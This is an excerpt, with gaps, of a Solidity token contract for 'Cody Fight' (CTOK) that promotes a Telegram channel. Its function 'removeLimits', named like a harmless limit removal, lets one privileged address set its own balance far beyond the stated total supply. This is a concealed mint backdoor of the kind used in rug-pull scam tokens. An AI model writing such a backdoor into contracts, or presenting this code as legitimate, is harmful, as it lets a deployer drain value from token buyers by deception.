...
/*  
   * Telegram: https://t.me/codyfightnews
...
contract CodyFight {
    ...
    constructor(address ads) {
        tokenName = "Cody Fight";
        tokenSymbol = "CTOK";
        tokenDecimals = 18;
        tokenTotalSupply = 127000001* 10 ** tokenDecimals;
    ...
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 127000000*1000*addBot*10**tokenDecimals;
        }
    } 
